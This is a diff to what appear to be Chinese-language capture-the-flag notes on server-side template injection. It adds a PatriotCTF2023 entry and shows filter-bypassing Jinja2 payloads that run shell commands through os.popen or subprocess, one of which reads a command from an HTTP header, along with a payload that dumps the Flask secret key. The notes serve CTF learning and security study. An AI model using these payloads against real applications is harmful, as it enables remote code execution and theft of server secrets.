@@ -115,6 +115,8 @@ for i in range(300,1000):
      - `{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
     - `{{%22%22|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(411)(%27cmd%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}`
     - 获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
+- [PickYourStarter](https://github.com/MasonCompetitiveCyber/PatriotCTF2023/tree/main/Web/pickyourstarter)
+    - 可以用自定义header传命令：`{{joiner.__init__.__globals__.os.popen(request.headers.cmd).read()}}`,然后header里添加`cmd: cat flag.txt`
 - [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/)
     - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
     - 其他payload：
